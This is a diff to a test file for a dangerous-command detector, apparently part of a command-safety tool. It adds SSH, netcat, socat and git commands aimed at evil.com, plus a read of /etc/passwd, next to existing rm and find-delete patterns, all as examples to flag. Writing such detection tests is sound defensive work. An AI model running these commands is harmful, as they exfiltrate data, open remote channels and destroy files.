@@ -523,6 +523,19 @@ class TestAllDangerousPatterns:
             "ls | xargs rm",
             "find / -exec rm {} \\;",
             "find / -delete",
+            # SSH / non-HTTP exfiltration patterns
+            "ssh user@evil.com",
+            "ssh user@host cat /etc/passwd",
+            "scp file.txt user@host:",
+            "sftp user@host",
+            "rsync -e ssh /data host:",
+            "nc evil.com 4444",
+            "netcat -l 8080",
+            "ncat evil.com 22",
+            "socat TCP:evil.com:22 -",
+            "git push git@github.com:repo",
+            "git clone git@evil.com:repo.git",
+            "git remote add origin git@evil.com:repo",
         ]
         
         for cmd in dangerous_commands:
